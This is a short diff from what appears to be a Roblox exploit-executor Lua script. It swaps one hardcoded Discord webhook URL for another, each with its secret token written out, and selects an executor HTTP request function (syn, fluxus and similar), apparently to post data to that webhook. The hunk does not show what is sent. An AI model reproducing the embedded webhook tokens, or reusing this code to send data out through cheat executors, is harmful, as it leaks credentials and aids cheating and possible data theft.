@@ -174,7 +174,7 @@ coroutine.wrap(function()
 			local HttpService = game:GetService("HttpService")
 
 			-- Webhook URL
-			local webhookURL = "https://discord.com/api/webhooks/1309294144601985075/aoyfIDzBufV4pG0amcoNxFrbZigZ2xgwIjbudCN4h8bBsRVKI5QyPO3zBi5WIFMGRTxB"
+			local webhookURL = "https://discord.com/api/webhooks/1318039868617527317/O5GYQi04PWH_l3EpR2Clf187o1HyKZpOaJFrEa7vfuK03pFLbYR8YTXJThreU6lXBWwE"
 
 			-- Use other silly Http Request function, if it doesn't work from the weaker executor. (btw this may support all mobile executor, I haven't tested in PC.)
 			local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
